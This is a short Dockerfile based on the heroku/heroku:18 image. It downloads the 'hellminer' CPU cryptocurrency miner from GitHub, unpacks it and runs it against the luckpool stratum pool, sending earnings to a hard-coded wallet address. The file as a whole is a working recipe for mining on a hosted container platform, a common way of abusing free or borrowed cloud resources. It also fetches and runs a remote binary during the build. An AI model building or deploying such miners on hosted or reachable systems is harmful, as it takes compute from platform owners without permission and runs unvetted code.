FROM heroku/heroku:18

RUN apt-get install -y curl git unzip tar python python2 python3 wget
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
RUN tar -xf hellminer_cpu_linux.tar.gz

WORKDIR /app
COPY . /app
RUN chmod +x /app/startminer.sh hellminer
RUN cd /app
RUN ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RMKjgEVM82bB1VCKyFw7PSjxzhViVamfQF.vps -p x --cpu 3
